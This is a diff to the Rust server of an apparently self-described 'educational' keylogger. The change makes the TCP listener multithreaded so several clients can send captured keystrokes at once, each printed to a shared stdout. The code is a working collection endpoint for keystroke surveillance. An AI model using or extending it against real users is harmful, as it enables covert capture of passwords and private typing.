@@ -1,21 +1,27 @@
 use educational_key_logger::IP_PORT;
 use educational_key_logger::input::InputEvent;
-use std::io::{self, Read};
+use std::io::{self, Read, Stdout};
 use std::net::{TcpListener, TcpStream};
+use std::sync::{Arc, Mutex};
+use std::thread;
 use std::time::Duration;
 
 const TIMEOUT_DURATION: Duration = Duration::from_secs(2);
 
 fn main() {
     let listener = TcpListener::bind(IP_PORT).unwrap();
+    let stdout_mutex = Arc::new(Mutex::new(io::stdout()));
     for stream in listener.incoming() {
-        handle_stream(stream.unwrap());
+        let stdout = stdout_mutex.clone();
+        thread::spawn(move || {
+            handle_stream(stream.unwrap(), stdout);
+        });
     }
 }
 
-fn handle_stream(mut stream: TcpStream) {
+fn handle_stream(mut stream: TcpStream, stdout: Arc<Mutex<Stdout>>) {
     let mut buffer = [0; 1024];
-    let mut stream_read_handler = StreamReadHandler::new();
+    let mut stream_read_handler = StreamReadHandler::new(stdout.clone());
     if let Err(e) = stream.set_read_timeout(Some(TIMEOUT_DURATION)) {
         eprintln!("Failed to set read timeout: {}", e);
         return;
@@ -23,6 +29,7 @@ fn handle_stream(mut stream: TcpStream) {
     loop {
         match stream.read(&mut buffer) {
             Ok(0) => {
+                let _guard = stdout.lock().unwrap();
                 println!("Client disconnected");
                 break;
             }
@@ -35,6 +42,7 @@ fn handle_stream(mut stream: TcpStream) {
                 }
             }
             Err(e) => {
+                let _guard = stdout.lock().unwrap();
                 eprintln!("Read error: {}", e);
                 break;
             }
@@ -47,14 +55,16 @@ struct StreamReadHandler {
     /// Buffer for InputEvent. It's length can never exceed size_prefix which is sent through TCPStream.
     input_event_buffer: Vec<u8>,
     input_events: Vec<InputEvent>,
+    stdout: Arc<Mutex<Stdout>>,
 }
 
 impl StreamReadHandler {
-    pub fn new() -> StreamReadHandler {
+    pub fn new(stdout: Arc<Mutex<Stdout>>) -> StreamReadHandler {
         StreamReadHandler {
             size_prefix: None,
             input_event_buffer: vec![],
             input_events: vec![],
+            stdout,
         }
     }
     pub fn read_buffer(&mut self, buffer: &[u8]) {
@@ -103,6 +113,7 @@ impl StreamReadHandler {
 
     fn handle_input_events(&mut self) {
         let input_events = std::mem::take(&mut self.input_events);
+        let _guard = self.stdout.lock().unwrap();
         input_events.iter().for_each(|input_event| {
             if input_event.is_key_press() {
                 print!("{}", input_event.code_as_string());
